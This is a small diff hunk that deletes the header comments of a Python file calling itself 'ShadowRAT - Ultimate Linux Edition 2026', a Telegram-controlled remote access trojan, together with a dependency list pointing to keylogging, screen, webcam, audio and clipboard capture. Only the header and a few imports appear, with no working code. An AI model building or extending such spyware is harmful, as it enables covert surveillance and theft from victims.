@@ -1,6 +1,3 @@
-# ShadowRAT - Ultimate Linux Edition 2026
-# Python 3.10+ | Required: pip install pyTelegramBotAPI pynput pillow opencv-python pyautogui psutil cryptography sounddevice soundfile pyperclip netifaces paramiko
-
 import telebot
 import os
 import platform
